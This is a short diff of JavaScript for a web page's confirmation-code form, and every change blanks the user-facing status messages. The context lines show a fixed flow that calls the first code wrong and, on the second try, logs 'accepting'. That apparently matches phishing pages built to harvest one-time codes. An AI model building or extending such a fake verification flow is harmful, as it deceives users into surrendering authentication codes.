@@ -186,17 +186,11 @@
 
   function updateInfoText() {
     if (attemptCount === 0) {
-      infoText.textContent = "Enter the code below. (First attempt)";
-      infoText.style.color = '#302b4a';
-      infoText.style.fontWeight = 'normal';
+      infoText.textContent = "";
     } else if (attemptCount === 1) {
-      infoText.textContent = "The code you entered was incorrect. Please try again. (Second attempt)";
-      infoText.style.color = '#c0392b';
-      infoText.style.fontWeight = 'bold';
+      infoText.textContent = "";
     } else {
-      infoText.textContent = "Code verified successfully! Redirecting...";
-      infoText.style.color = '#27ae60';
-      infoText.style.fontWeight = 'bold';
+      infoText.textContent = "";
     }
   }
 
@@ -208,9 +202,7 @@
 
   resendBtn.addEventListener("click", function () {
     codeError.textContent = "";
-    infoText.textContent = "A new confirmation code has been sent. (First attempt)";
-    infoText.style.color = '#302b4a';
-    infoText.style.fontWeight = 'normal';
+    infoText.textContent = "";
     codeInput.value = "";
     codeInput.focus();
     
@@ -269,9 +261,7 @@
         sessionStorage.setItem(attemptKey, '1');
         
         // Update info text
-        infoText.textContent = "The code you entered was incorrect. Please try again. (Second attempt)";
-        infoText.style.color = '#c0392b';
-        infoText.style.fontWeight = 'bold';
+        infoText.textContent = "";
         
         // Reset button
         submitBtn.disabled = false;
@@ -290,9 +280,7 @@
       console.log('✅ Second attempt - accepting');
       
       // Update info text
-      infoText.textContent = "Code verified successfully! Redirecting...";
-      infoText.style.color = '#27ae60';
-      infoText.style.fontWeight = 'bold';
+      infoText.textContent = "";
       
       // Clear session storage
       try {
